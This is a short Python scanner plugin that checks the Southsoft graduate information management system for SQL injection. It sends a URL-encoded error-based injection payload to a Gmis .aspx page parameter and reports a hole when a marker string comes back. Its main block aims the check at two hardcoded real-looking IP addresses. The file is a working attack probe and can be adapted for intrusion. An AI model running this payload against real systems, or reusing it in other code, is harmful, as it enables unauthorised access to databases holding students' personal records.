#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:xq17
#Name:南软研究生信息管理系统SQL注入漏洞大礼包
#Refer:http://www.wooyun.org/whitehats/岩少/type/1/page/2

def assign(service,arg):
    if service=="southsoft":
        return True,arg 


def  audit(arg):
    ps=[
        "Gmis/pygl/pyxkcxedit.aspx?xh=",
        # "Gmis/pygl/kclbtj_mc.aspx?kclb=A&kclbmc=",
        # "Gmis/sshd/msgdetail.aspx?id=",
        # "Gmis/sshd/sendmsg.aspx?id=",
            ]
    data = "%27%20and%20(CHAR(126)%2BCHAR(116)%2BCHAR(101)%2BCHAR(115)%2BCHAR(116)%2BCHAR(88)%2BCHAR(81)%2BCHAR(49)%2BCHAR(55))%3E0--"
    for p in ps:
        url=arg+p+data
        code,head,res,errcode,_=curl.curl2(url)
        if code==500 and "testXQ17" in res:
            security_hole(url)
        
        
if __name__=="__main__":
    from dummy import *
    audit(assign('southsoft','http://210.43.126.80:8080/')[1])
    # audit(assign('southsoft','http://101.76.99.20/')[1])